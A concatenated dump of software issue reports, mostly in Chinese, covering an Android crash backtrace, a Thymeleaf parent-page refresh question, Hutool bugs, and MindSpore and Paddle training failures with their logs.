07-05 17:32:31.309 14848 14848 F DEBUG : x20 0000000000000000 x21 00000072378593f0 x22 0000000000000010 x23 0000007237d44020 07-05 17:32:31.309 14848 14848 F DEBUG : x24 0000000000000000 x25 0000000000000008 x26 0000007237d44020 x27 000000723754ea30 07-05 17:32:31.309 14848 14848 F DEBUG : x28 000000723754ea30 x29 0000000000000002 07-05 17:32:31.309 14848 14848 F DEBUG : sp 0000007237d43910 lr 0000005624aa1018 pc 0000005624aa1028 07-05 17:32:31.309 14848 14848 F DEBUG : 07-05 17:32:31.309 14848 14848 F DEBUG : backtrace: 07-05 17:32:31.310 14848 14848 F DEBUG : NOTE: Function names and BuildId information is missing for some frames due 07-05 17:32:31.310 14848 14848 F DEBUG : NOTE: to unreadable libraries. For unwinds of apps, only shared libraries 07-05 17:32:31.310 14848 14848 F DEBUG : NOTE: found under the lib/ directory are readable. 07-05 17:32:31.310 14848 14848 F DEBUG : #00 pc 000000000010f028 /data/local/tmp/new_net_test_mslite 07-05 17:32:31.310 14848 14848 F DEBUG : #01 pc 000000000010eed4 /data/local/tmp/new_net_test_mslite 07-05 17:32:31.310 14848 14848 F DEBUG : #02 pc 000000000011748c /data/local/tmp/new_net_test_mslite 07-05 17:32:31.310 14848 14848 F DEBUG : #03 pc 0000000000117598 /data/local/tmp/new_net_test_mslite 07-05 17:32:31.310 14848 14848 F DEBUG : #04 pc 000000000011f37c /data/local/tmp/new_net_test_mslite 07-05 17:32:31.310 14848 14848 F DEBUG : #05 pc 000000000012396c /data/local/tmp/new_net_test_mslite 07-05 17:32:31.310 14848 14848 F DEBUG : #06 pc 00000000001243e4 /data/local/tmp/new_net_test_mslite 07-05 17:32:31.310 14848 14848 F DEBUG : #07 pc 00000000000cf6f0 /apex/com.android.runtime/lib64/bionic/libc.so (__pthread_start(void*)+36) (BuildId: 928809e4bdb773b35f649f8fb0d674ce) 07-05 17:32:31.310 14848 14848 F DEBUG : #08 pc 00000000000720e8 /apex/com.android.runtime/lib64/bionic/libc.so (__start_thread+64) (BuildId: 928809e4bdb773b35f649f8fb0d674ce)"
子页面刷新父页面补充,"以下是父页面 **以下是add添加页面 ** 目前我使用的是 来实现刷新父页面，但是他把侧边导航也一起刷新了，上次说可以使用ifname来实现刷新，我研究了半天不知道怎么弄，可以帮我实现一下不，我不知道都传什么参数， 目前我使用的是 来实现刷新父页面，但是他把侧边导航也一起刷新了，上次说可以使用ifname来实现刷新，我研究了半天不知道怎么弄，可以帮我实现一下不，我不知道都传什么参数，   <code>: &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;html lang=""zh"" xmlns:th=""http://www.thymeleaf.org"" xmlns:shiro=""http://www.pollix.at/thymeleaf/shiro""&gt; &lt;head&gt; &lt;th:block th:include=""include :: header('便签墙')""/&gt; &lt;meta charset=""utf-8""&gt; &lt;meta name=""viewport"" content=""width=device-width, initial-scale=1.0""&gt; &lt;link rel=""shortcut icon"" href=""favicon.ico""&gt; &lt;link rel=""stylesheet"" th:href=""@{/blog/mblog/css/jquery.pagination.css}""/&gt; &lt;/head&gt; &lt;body class=""gray-bg""&gt; &lt;div class=""row""&gt; &lt;div class=""col-sm-12""&gt; &lt;div class=""wrapper wrapper-content animated fadeInUp""&gt; &lt;a class=""btn btn-sm btn-white"" onclick=""$.operate.add()"" shiro:hasPermission=""memorial:pin_board:add"" &gt; &lt;i class=""fa fa-plus""&gt;&lt;/i&gt;添加 &lt;/a&gt; &lt;a class=""btn btn-sm btn-white"" th:href=""@{/memorial/pinBoard}"" shiro:hasPermission=""memorial:pin_board:view""&gt; &lt;i class=""fa fa-refresh""&gt;&lt;/i&gt; 刷新 &lt;/a&gt; &lt;ul class=""notes"" th:each=""pinBoard:${pinDateInfo.rows}""&gt; &lt;li&gt; &lt;div&gt; &lt;small th:text=""${#dates.format(pinBoard.createTime,'yyyy年MM月dd日 HH时mm分ss秒')}""&gt;&lt;/small&gt; &lt;h4 th:text=""${pinBoard.boardTitle}""&gt;&lt;/h4&gt; &lt;p th:utext=""${pinBoard.boardContent}""&gt;&lt;/p&gt; &lt;!-- 编辑--&gt; &lt;a style=""padding-right: 20px;"" href=""javascript:void(0)"" shiro:hasPermission=""memorial:pin_board:edit"" th:onclick=""$.operate.edit('[(${pinBoard.id})]')""&gt;&lt;i class=""fa fa-edit""&gt;&lt;/i&gt;&lt;/a&gt; &lt;!-- 删除--&gt; &lt;a href=""javascript:void(0)"" shiro:hasPermission=""memorial:pin_board:remove"" th:onclick=""$.operate.removeReturn('[(${pinBoard.id})]')""&gt;&lt;i class=""fa fa-trash-o ""&gt;&lt;/i&gt;&lt;/a&gt; &lt;/div&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- 分页--&gt; &lt;div th:if=""${pinDateInfo!=null &amp;&amp; pinDateInfo.totalPage gt 1}"" id=""pagebar"" style=""text-align:center""&gt; &lt;div id=""pagination"" class=""page""&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;th:block th:include=""include :: footer""/&gt; &lt;script th:src=""@{/blog/mblog/js/jquery.pagination.min.js}""&gt;&lt;/script&gt; &lt;script th:inline=""javascript""&gt; var addFlag = [[${@permission.hasPermi('memorial:pin_board:add')}]]; var editFlag = [[${@permission.hasPermi('memorial:pin_board:edit')}]]; var removeFlag = [[${@permission.hasPermi('memorial:pin_board:remove')}]]; var classTypeDatas = [[${@dict.getType('account_income_pay')}]]; var classStatusDatas = [[${@dict.getType('sys_normal_disable')}]]; var prefix = ctx + ""memorial/pinBoard""; $(function () { var options = { url: prefix + ""/list"", createUrl: prefix + ""/add"", updateUrl: prefix + ""/edit/{id}"", removeUrl: prefix + ""/remove"", exportUrl: prefix + ""/export"", modalName: ""备忘录"", }; $.table.init(options); }); // 分页请求 $(function () { var $pagination = $(""#pagination""); if ($pagination) { $pagination.pagination({ currentPage: [[${pinDateInfo.currentPage}]], totalPage: [[${pinDateInfo.totalPage}]], callback: function (pageNo) { // 发出分页请求 window.location.href = ('/memorial/pinBoard' + '?currentPage=' + pageNo); } }); } }) &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; &lt;!DOCTYPE html&gt; &lt;html lang=""zh"" xmlns:th=""http://www.thymeleaf.org""&gt; &lt;head&gt; &lt;th:block th:include=""include :: header('新增便签墙')""/&gt; &lt;/head&gt; &lt;body class=""white-bg""&gt; &lt;div class=""wrapper wrapper-content animated fadeInRight ibox-content""&gt; &lt;form class=""form-horizontal m"" id=""form-board-add""&gt; &lt;div class=""form-group""&gt; &lt;label class=""col-sm-3 control-label is-required""&gt;标题：&lt;/label&gt; &lt;div class=""col-sm-8""&gt; &lt;input name=""boardTitle"" class=""form-control"" type=""text"" placeholder=""标题不要超过10个字哟"" required&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=""form-group""&gt; &lt;label class=""col-sm-3 control-label is-required""&gt;内容：&lt;/label&gt; &lt;div class=""col-sm-8""&gt; &lt;textarea name=""boardContent"" rows=""8px"" class=""form-control"" placeholder=""内容不可以超过100个字符哈"" required&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=""form-group""&gt; &lt;label class=""col-sm-3 control-label is-required""&gt;顺序：&lt;/label&gt; &lt;div class=""col-sm-8""&gt; &lt;input name=""orderNum"" class=""form-control"" min=""1"" type=""number"" required&gt; &lt;/div&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;th:block th:include=""include :: footer""/&gt; &lt;script th:inline=""javascript""&gt; var prefix = ctx + ""memorial/pinBoard"" $(""#form-board-add"").validate({ focusCleanup: true }); function submitHandler() { if ($.validate.form()) { var data = $('#form-board-add').serialize(); var config = { url: prefix + ""/add"", type: ""post"", dataType: ""json"", data: data, beforeSend: function () { $.modal.loading(""正在处理中，请稍候...""); $.modal.disable(); }, success: function (result) { if (result.code == 0){ $.modal.msgReload(); // parent.location.reload(); // $.modal.msgSuccess(""保存成功""); } } }; $.ajax(config) } } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; $.modal.msgReload(); var topWindow = $(window.parent.document); var currentId = $('.page-tabs-content', topWindow).find('.active').attr('data-panel'); var $contentWindow = $('.RuoYi_iframe[data-id=""' + currentId + '""]', topWindow)[0].contentWindow; $contentWindow.父页面的方法(参数); $.modal.msgReload();"
返回参数含有多个<![CDATA[ ]]>时直接报错：Parse XML from stream error!,"JDK版本： 11.0.12 hutool版本： 5.7.14 [Fatal Error] :7:264: 元素类型 ""Response"" 必须由匹配的结束标记 """" 终止。 ===my print===&gt;&gt;运行时异常: cn.hutool.core.exceptions.UtilException: Parse XML from stream error! at cn.hutool.core.util.XmlUtil.readXML(XmlUtil.java:229) 通过postman可以直接得到结果，出现多个的都报错 比如报错的Excel文件，有问题的图片等。   <code>: SoapClient client = SoapUtil.getSoapClient().setMethod(""ins:SynchroLabReport"", ""Inspection"").setParam(""inspectionId"", ao.getInspectionId()); String send = client.send(true);"
5.7.17 CharSequenceUtil.replace() bug,"JDK版本： openjdk_8_201 hutool版本： 5.7.17 堆栈信息 <ol start=""3"">   <code>: String replace = ""#{A}""; replace = StrUtil.replace(replace, ""#{AAAAAAA}"", ""1""); System.out.println(replace); java.lang.NegativeArraySizeException at java.lang.AbstractStringBuilder.&lt;init&gt;(AbstractStringBuilder.java:68) at java.lang.StringBuilder.&lt;init&gt;(StringBuilder.java:101) at cn.hutool.core.text.CharSequenceUtil.replace(CharSequenceUtil.java:3547) at cn.hutool.core.text.CharSequenceUtil.replace(CharSequenceUtil.java:3503) at TestString.test2(TestString.java:48) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at"
Change the CpuMatrix::copyFrom and CpuVector::copyFrom with the strea…,Change the and with the stream parameter to the synchronous interface. This bug is found by @pengli09. And error occurs when parallel_nn = 1.   <code>: CpuMatrix::copyFrom CpuVector::copyFrom
【MindSpore】【Ascend】【C类】SSD ghostnet在r1.3版本分布式训练精度23.0%，达不到论文规格24.1%,"名称 问题报告 使用此模板报告bug 种类/bug 软件环境： -- 源版本：-- -- Python版本：Python 3.7.5 --操作系统平台及分布：Linux Ubuntu 18.04 --MindSpore版本：mindspore-ascend 1.3.0 -- ##相关测试用例 参照资料见： https://gitee.com/mindspore/models/blob/master/research/cv/ssd_ghostnet/README.md ##复现步骤 1、准备数据集coco2017。 2、启动容器。 3、修改配置文件，内容如下： enable_modelarts: False Url for modelarts data_url: """" train_url: """" checkpoint_url: """" Path for local run_distribute: False enable_profiling: False data_path: ""/data/coco2017"" output_path: ""/cache/train"" load_path: ""/cache/checkpoint_path/"" device_target: ""Ascend"" checkpoint_path: ""./checkpoint/"" checkpoint_file_path: ""ssd-500_458.ckpt"" 4、scripts下执行命令进行单机多卡训练。 分布式训练示例（8卡） 命令示例： root@e6a2be63ce28:/data1/zxp/ssd_ghostnet/scripts# bash run_distribute_train_ghostnet.sh 8 500 0.05 coco /data1/zxp/ssd_ghostnet/hccl_8p_01234567_127.0.1.1.json 5、根目录下使用命令tail -f ../LOG0/log.txt查看训练日志，确认训练成功。 root@e6a2be63ce28:/data1/zxp/ssd_ghostnet/scripts# tail -f ../LOG0/log.txt 。。。 epoch: 490 step: 458, loss is 0.7889087 epoch time: 79930.825 ms, per step time: 174.521 ms epoch: 491 step: 458, loss is 0.92624664 epoch time: 79357.985 ms, per step time: 173.271 ms epoch: 492 step: 458, loss is 0.8798319 epoch time: 79261.378 ms, per step time: 173.060 ms epoch: 493 step: 458, loss is 0.8820793 epoch time: 79259.408 ms, per step time: 173.055 ms epoch: 494 step: 458, loss is 0.7834986 epoch time: 79257.149 ms, per step time: 173.051 ms epoch: 495 step: 458, loss is 0.7292407 epoch time: 79251.493 ms, per step time: 173.038 ms epoch: 496 step: 458, loss is 0.69783807 epoch time: 79278.374 ms, per step time: 173.097 ms epoch: 497 step: 458, loss is 0.89226353 epoch time: 79261.426 ms, per step time: 173.060 ms epoch: 498 step: 458, loss is 0.8242222 epoch time: 79254.570 ms, per step time: 173.045 ms epoch: 499 step: 458, loss is 0.7578002 epoch time: 79256.436 ms, per step time: 173.049 ms epoch: 500 step: 458, loss is 0.8553128 epoch time: 80024.181 ms, per step time: 174.725 ms 6、确认训练完成输出模型成功。 root@e6a2be63ce28:/data1/zxp/ssd_ghostnet/scripts# ll ../LOG0/output/checkpoint/0 total 2692924 drwx------ 2 root root 4096 Dec 11 19:59 ./ drwx------ 3 root root 4096 Dec 11 08:48 ../ -r-------- 1 root root 55113171 Dec 11 11:10 ssd-100_458.ckpt -r-------- 1 root root 55113171 Dec 11 09:11 ssd-10_458.ckpt -r-------- 1 root root 55113171 Dec 11 11:24 ssd-110_458.ckpt -r-------- 1 root root 55113171 Dec 11 11:37 ssd-120_458.ckpt -r-------- 1 root root 55113171 Dec 11 11:50 ssd-130_458.ckpt -r-------- 1 root root 55113171 Dec 11 12:03 ssd-140_458.ckpt -r-------- 1 root root 55113171 Dec 11 12:17 ssd-150_458.ckpt -r-------- 1 root root 55113171 Dec 11 12:30 ssd-160_458.ckpt -r-------- 1 root root 55113171 Dec 11 12:43 ssd-170_458.ckpt -r-------- 1 root root 55113171 Dec 11 12:56 ssd-180_458.ckpt -r-------- 1 root root 55113171 Dec 11 13:09 ssd-190_458.ckpt -r-------- 1 root root 55113171 Dec 11 13:23 ssd-200_458.ckpt -r-------- 1 root root 55113171 Dec 11 09:25 ssd-20_458.ckpt -r-------- 1 root root 55113171 Dec 11 13:36 ssd-210_458.ckpt -r-------- 1 root root 55113171 Dec 11 13:49 ssd-220_458.ckpt -r-------- 1 root root 55113171 Dec 11 14:02 ssd-230_458.ckpt -r-------- 1 root root 55113171 Dec 11 14:16 ssd-240_458.ckpt -r-------- 1 root root 55113171 Dec 11 14:29 ssd-250_458.ckpt -r-------- 1 root root 55113171 Dec 11 14:42 ssd-260_458.ckpt -r-------- 1 root root 55113171 Dec 11 14:55 ssd-270_458.ckpt -r-------- 1 root root 55113171 Dec 11 15:09 ssd-280_458.ckpt -r-------- 1 root root 55113171 Dec 11 15:22 ssd-290_458.ckpt -r-------- 1 root root 55113171 Dec 11 15:35 ssd-300_458.ckpt -r-------- 1 root root 55113171 Dec 11 09:38 ssd-30_458.ckpt -r-------- 1 root root 55113171 Dec 11 15:48 ssd-310_458.ckpt -r-------- 1 root root 55113171 Dec 11 16:01 ssd-320_458.ckpt -r-------- 1 root root 55113171 Dec 11 16:15 ssd-330_458.ckpt -r-------- 1 root root 55113171 Dec 11 16:28 ssd-340_458.ckpt -r-------- 1 root root 55113171 Dec 11 16:41 ssd-350_458.ckpt -r-------- 1 root root 55113171 Dec 11 16:54 ssd-360_458.ckpt -r-------- 1 root root 55113171 Dec 11 17:08 ssd-370_458.ckpt -r-------- 1 root root 55113171 Dec 11 17:21 ssd-380_458.ckpt -r-------- 1 root root 55113171 Dec 11 17:34 ssd-390_458.ckpt -r-------- 1 root root 55113171 Dec 11 17:47 ssd-400_458.ckpt -r-------- 1 root root 55113171 Dec 11 09:51 ssd-40_458.ckpt -r-------- 1 root root 55113171 Dec 11 18:00 ssd-410_458.ckpt -r-------- 1 root root 55113171 Dec 11 18:14 ssd-420_458.ckpt -r-------- 1 root root 55113171 Dec 11 18:27 ssd-430_458.ckpt -r-------- 1 root root 55113171 Dec 11 18:40 ssd-440_458.ckpt -r-------- 1 root root 55113171 Dec 11 18:53 ssd-450_458.ckpt -r-------- 1 root root 55113171 Dec 11 19:07 ssd-460_458.ckpt -r-------- 1 root root 55113171 Dec 11 19:20 ssd-470_458.ckpt -r-------- 1 root root 55113171 Dec 11 19:33 ssd-480_458.ckpt -r-------- 1 root root 55113171 Dec 11 19:46 ssd-490_458.ckpt -r-------- 1 root root 55113171 Dec 11 19:59 ssd-500_458.ckpt -r-------- 1 root root 55113171 Dec 11 10:04 ssd-50_458.ckpt -r-------- 1 root root 55113171 Dec 11 10:18 ssd-60_458.ckpt -r-------- 1 root root 55113171 Dec 11 10:31 ssd-70_458.ckpt -r-------- 1 root root 55113171 Dec 11 10:44 ssd-80_458.ckpt -r-------- 1 root root 55113171 Dec 11 10:57 ssd-90_458.ckpt -rw------- 1 root root 1753186 Dec 11 09:00 ssd-graph.meta 7、评估精度。 评估 python eval.py --device_id 0 --dataset coco --checkpoint_file_path LOG4/ssd-500_458.ckpt 命令示例： root@e6a2be63ce28:/data1/zxp/ssd_ghostnet# python eval.py --device_id 0 --dataset coco --checkpoint_file_path /data1/zxp/ssd_ghostnet/LOG0/output/checkpoint/0/ssd-500_458.ckpt 8、查看打屏评估日志。 root@e6a2be63ce28:/data1/zxp/ssd_ghostnet# python eval.py --device_id 0 --dataset coco --checkpoint_file_path /data1/zxp/ssd_ghostnet/LOG0/output/checkpoint/0/ssd-500_458.ckpt {'enable_modelarts': 'Whether training on modelarts, default: False', 'data_url': 'Dataset url for obs', 'train_url': 'Training output url for obs', 'checkpoint_url': 'The location of checkpoint for obs', 'data_path': 'Dataset path for local', 'output_path': 'Training output path for local', 'load_path': 'The location of checkpoint for obs', 'device_target': 'Target device type, available: [Ascend, GPU, CPU]', 'enable_profiling': 'Whether enable profiling while training, default: False', 'num_classes': 'Class for dataset', 'batch_size': 'Batch size for training and evaluation', 'epoch_size': 'Total training epochs.', 'keep_checkpoint_max': 'keep the last keep_checkpoint_max checkpoint', 'checkpoint_path': 'The location of the checkpoint file.', 'checkpoint_file_path': 'The location of the checkpoint file.'} {'alpha': 0.75, 'anno_path': '', 'aspect_ratios': [[2], [2, 3], [2, 3], [2, 3], [2, 3], [2, 3]], 'batch_size': 32, 'checkpoint_file_path': '/data1/zxp/ssd_ghostnet/LOG0/output/checkpoint/0/ssd-500_458.ckpt', 'checkpoint_path': './checkpoint/', 'checkpoint_url': '', 'coco_classes': ['background', 'person', 'bicycle', 'car', 'motorcycle', 'airplane', 'bus', 'train', 'truck', 'boat', 'traffic light', 'fire hydrant', 'stop sign', 'parking meter', 'bench', 'bird', 'cat', 'dog', 'horse', 'sheep', 'cow', 'elephant', 'bear', 'zebra', 'giraffe', 'backpack', 'umbrella', 'handbag', 'tie', 'suitcase', 'frisbee', 'skis', 'snowboard', 'sports ball', 'kite', 'baseball bat', 'baseball glove', 'skateboard', 'surfboard', 'tennis racket', 'bottle', 'wine glass', 'cup', 'fork', 'knife', 'spoon', 'bowl', 'banana', 'apple', 'sandwich', 'orange', 'broccoli', 'carrot', 'hot dog', 'pizza', 'donut', 'cake', 'chair', 'couch', 'potted plant', 'bed', 'dining table', 'toilet', 'tv', 'laptop', 'mouse', 'remote', 'keyboard', 'cell phone', 'microwave', 'oven', 'toaster', 'sink', 'refrigerator', 'book', 'clock', 'vase', 'scissors', 'teddy bear', 'hair drier', 'toothbrush'], 'config_path': '/data1/zxp/ssd_ghostnet/src/model_utils/../../default_config.yaml', 'data_path': '/data/coco2017', 'data_url': '', 'dataset': 'coco', 'device_id': 0, 'device_num': 8, 'device_target': 'Ascend', 'enable_modelarts': False, 'enable_profiling': False, 'epoch_size': 500, 'extras_in_channels': [256, 864, 1248, 512, 256, 256], 'extras_out_channels': [864, 1248, 512, 256, 256, 128], 'extras_ratio': [0.2, 0.2, 0.2, 0.25, 0.5, 0.25], 'extras_srides': [1, 1, 2, 2, 2, 2], 'feature_size': [19, 10, 5, 3, 2, 1], 'file_format': 'AIR', 'file_name': 'ssd_ghostnet', 'filter_weight': False, 'gamma': 2.0, 'global_step': 0, 'image_dir': '', 'img_path': '', 'img_shape': [300, 300], 'instances_set': 'annotations/instances_{}.json', 'load_path': '/cache/checkpoint_path/', 'loss_scale': 1024, 'lr': 0.5, 'lr_end_rate': 0.001, 'lr_init': 0.001, 'match_thershold': 0.5, 'max_boxes': 100, 'max_scale': 0.95, 'min_scale': 0.2, 'min_score': 0.1, 'momentum': 0.9, 'neg_pre_positive': 3, 'nms_thershold': 0.6, 'num_classes': 81, 'num_default': [3, 6, 6, 6, 6, 6], 'num_ssd_boxes': 1917, 'only_create_dataset': False, 'output_path': '/cache/train', 'pre_trained': '', 'pre_trained_epoch_size': 0, 'prior_scaling': [0.1, 0.2], 'result_path': '', 'run_distribute': False, 'save_checkpoint_epochs': 10, 'sink_mode': 'sink', 'steps': [16, 32, 64, 100, 150, 300], 'train_data_type': 'train2017', 'train_url': '', 'val_data_type': 'val2017', 'voc_dir': '', 'voc_root': '', 'warmup_epochs': 2, 'weight_decay': 0.00015} Please check the above information for the configurations Start Eval! [WARNING] ME(34803:139808972392256,MainProcess):2021-12-13-02:57:02.419.905 [mindspore/dataset/engine/datasets.py:3463] WARN: global shuffle is not used. Load Checkpoint! [WARNING] ME(34803:139808972392256,MainProcess):2021-12-13-02:57:03.874.459 [mindspore/train/serialization.py:581] Remove parameter prefix name: network., continue to load. ======================================== total images num: 4541 Processing, please wait a moment. [WARNING] SESSION(34803,7f2651ffb700,python):2021-12-13-02:57:14.369.655 [mindspore/ccsrc/backend/session/ascend_session.cc:1381] SelectKernel] There are 131 node/nodes used reduce precision to selected the kernel! 100% [4541/4541] cost 105904 ms loading annotations into memory... Done (t=0.64s) creating index... index created! Loading and preparing results... DONE (t=9.25s) creating index... index created! Running per image evaluation... Evaluate annotation type <em>bbox</em> DONE (t=69.47s). Accumulating evaluation results... DONE (t=20.48s). Average Precision (AP) @[ IoU=0.50:0.95 | area= all | maxDets=100 ] = 0.230 Average Precision (AP) @[ IoU=0.50 | area= all | maxDets=100 ] = 0.394 Average Precision (AP) @[ IoU=0.75 | area= all | maxDets=100 ] = 0.231 Average Precision (AP) @[ IoU=0.50:0.95 | area= small | maxDets=100 ] = 0.038 Average Precision (AP) @[ IoU=0.50:0.95 | area=medium | maxDets=100 ] = 0.193 Average Precision (AP) @[ IoU=0.50:0.95 | area= large | maxDets=100 ] = 0.419 Average Recall (AR) @[ IoU=0.50:0.95 | area= all | maxDets= 1 ] = 0.243 Average Recall (AR) @[ IoU=0.50:0.95 | area= all | maxDets= 10 ] = 0.381 Average Recall (AR) @[ IoU=0.50:0.95 | area= all | maxDets=100 ] = 0.414 Average Recall (AR) @[ IoU=0.50:0.95 | area= small | maxDets=100 ] = 0.113 Average Recall (AR) @[ IoU=0.50:0.95 | area=medium | maxDets=100 ] = 0.428 Average Recall (AR) @[ IoU=0.50:0.95 | area= large | maxDets=100 ] = 0.677 ======================================== mAP: 0.2301656396788657 ##描述当前行为 进行分布式训练 ##描述期望的行为 分布式训练成功，精度性能达标 ##相关日志/截图 1、B类给定的精度为：24.2%，论文规格为24.1% 本次训练精度为23.02，达不到论文标准。 ##本期特别说明   <code>: bash run_distribute_train_ghostnet.sh [DEVICE_NUM] [EPOCH_SIZE] [LR] [DATASET] [RANK_TABLE_FILE] [PRE_TRAINED](optional) [PRE_TRAINED_EPOCH_SIZE](optional)"
【MindSpore】【Ascend】【C类】【SPPnet】8p训练启动失败,"SPPNet模型8卡启动失败 Hardware Environment(Ascend/GPU/CPU) / 硬件环境: /device ascend : -- CANN 版本: (CANN 5.0.4 B058) --Python 版本:Python 3.7.5 --操作系统版本 (e.g., Ubuntu 18.04):Ubuntu 18.04 --mindspore版本：1.3.0 1、执行命令：bash run_distribution_ascend.sh /home/lh/SPPNet/hccl_8p_01234567_127.0.1.1.json /data/imagenet2012/train/ /data/imagenet2012/val/ sppnet_single 2、查看训练日志 8p训练功能正常，成功生成模型文件，性能&amp;精度达标 实际训练失败，训练日志如下：   <code>: root@45043496c2e5:/home/lh/SPPNet/scripts# cat sppnet_single_train_parallel0/log [WARNING] HCCL_ADPT(5077,ffffbc16e010,python3.7):2022-04-20-11:46:44.103.500 [mindspore/ccsrc/runtime/hccl_adapter/hccl_adapter.cc:55] GenHcclOptions] DEPLOY_MODE is not set in ENV. Now set to default value 0 device_num: 8 ============== Starting Training ============== Traceback (most recent call last): File ""train.py"", line 185, in &lt;module&gt; model.train(cfg.epoch_size, ds_train, callbacks=cb, dataset_sink_mode=True, sink_size=args.sink_size) File ""/usr/local/lib/python3.7/dist-packages/mindspore/train/model.py"", line 649, in train sink_size=sink_size) File ""/usr/local/lib/python3.7/dist-packages/mindspore/train/model.py"", line 439, in _train self._train_dataset_sink_process(epoch, train_dataset, list_callback, cb_params, sink_size) File ""/usr/local/lib/python3.7/dist-packages/mindspore/train/model.py"", line 490, in _train_dataset_sink_process dataset_helper=dataset_helper) File ""/usr/local/lib/python3.7/dist-packages/mindspore/train/model.py"", line 322, in _exec_preprocess dataset_helper = DatasetHelper(dataset, dataset_sink_mode, sink_size, epoch_num) File ""/usr/local/lib/python3.7/dist-packages/mindspore/train/dataset_helper.py"", line 245, in __init__ self.iter = iterclass(dataset, sink_size, epoch_num) File ""/usr/local/lib/python3.7/dist-packages/mindspore/train/dataset_helper.py"", line 392, in __init__ super().__init__(dataset, sink_size, epoch_num) File ""/usr/local/lib/python3.7/dist-packages/mindspore/train/dataset_helper.py"", line 299, in __init__ create_data_info_queue=create_data_info_queue) File ""/usr/local/lib/python3.7/dist-packages/mindspore/train/_utils.py"", line 63, in _exec_datagraph dataset_types, dataset_shapes = _get_types_and_shapes(exec_dataset) File ""/usr/local/lib/python3.7/dist-packages/mindspore/train/_utils.py"", line 52, in _get_types_and_shapes dataset_types = _convert_type(dataset.output_types()) File ""/usr/local/lib/python3.7/dist-packages/mindspore/dataset/engine/datasets.py"", line 1547, in output_types self.saved_output_shapes = runtime_getter[0].GetOutputShapes() RuntimeError: Unexpected error. Numa package (libnuma.so) not found. Line of code : 156 File : /home/jenkins/agent-working-dir/workspace/Compile_Ascend_ARM_CentOS/mindspore/mindspore/ccsrc/minddata/dataset/engine/execution_tree.cc"
enbale auto set env of V1 on Mac,本地快速测试了下， 没有加任何参数，截止到train之前没有出现 /proc/cpuinfo 不识别之类的问题了。   <code>: paddle train
Operation not permitted，用sudo执行也是同样的错，所有源都一样,Steps to reproduce Error information   <code>: fatal: Unable to read current working directory: Operation not permitted fatal: Unable to read current working directory: Operation not permitted 未发现Git代理（属于正常状态） Cloning into '/usr/local/Homebrew'... fatal: Unable to read current working directory: Operation not permitted m此步骤失败 '尝试再次运行自动脚本选择其他下载源或者切换网络'```
[ST][MS/modelzoo][NET][Ascend][Caddn]训练失败,"caddn-Ascend上训练失败，阻塞 / 硬件环境: /device ascend : -- MindSpore version :r2.0 commit_id:86e09672 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_caddn_kitti_910_train_loss_4p_0001.py cd solution_test/cases/02network/00cv/caddn/ pytest -s test_ms_caddn_kitti_910_train_loss_4p_0001 网络训练成功 走给胡安东   <code>: [TRACE] TDT(194446,python3):2022-11-04-02:29:23.389.101 [status:Running] [log.cpp:154]Channel ""6e4dcd7c-5ba5-11ed-a68f-a01c8dbbc9aa"": Send Sample Files,[tensor_data_deliver.cpp:279:Send]5768 [ERROR] ANALYZER(194446,ffff7fcd8010,python3):2022-11-04-02:29:33.688.361 [mindspore/ccsrc/pipeline/jit/static_analysis/async_eval_result.cc:66] HandleException] Exception happened, check the information as below. The function call stack (See file '/home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/00cv/caddn/train/test_ms_caddn_kitti_910_train_loss_4p_0001/mindspore/tools/rank_0/om/analyze_fail.dat' for more details. Get instructions about `analyze_fail.dat` at https://www.mindspore.cn/search?inputValue=analyze_fail.dat): # 0 In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/dataset_helper.py:106 return self.network(*outputs) ^ # 1 In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py:379 loss = self.network(*inputs) ^ # 2 In file /home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/00cv/caddn/train/test_ms_caddn_kitti_910_train_loss_4p_0001/mindspore/tools/../pcdet/models_ms/detectors/caddn.py:16 for cur_module in self.module_list: # 3 In file /home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/00cv/caddn/train/test_ms_caddn_kitti_910_train_loss_4p_0001/mindspore/tools/../pcdet/models_ms/detectors/caddn.py:17 batch_dict = cur_module(batch_dict) ^ # 4 In file /home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/00cv/caddn/train/test_ms_caddn_kitti_910_train_loss_4p_0001/mindspore/tools/../pcdet/models_ms/backbones_3d/ffe/depth_ffe.py:58 if self.channel_reduce is not None: # 5 In file /home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/00cv/caddn/train/test_ms_caddn_kitti_910_train_loss_4p_0001/mindspore/tools/../pcdet/models_ms/backbones_3d/ffe/depth_ffe.py:52 ddn_result = self.ddn(images) ^ # 6 In file /home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/00cv/caddn/train/test_ms_caddn_kitti_910_train_loss_4p_0001/mindspore/tools/../pcdet/models_ms/backbones_3d/ffe/ddn/ddn_template.py:103 if self.device_target == ""Ascend"": # 7 In file /home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/00cv/caddn/train/test_ms_caddn_kitti_910_train_loss_4p_0001/mindspore/tools/../pcdet/models_ms/backbones_3d/ffe/ddn/ddn_template.py:105 x = P.ResizeBilinear(feat_shape, align_corners=False, half_pixel_centers=True)(x)"
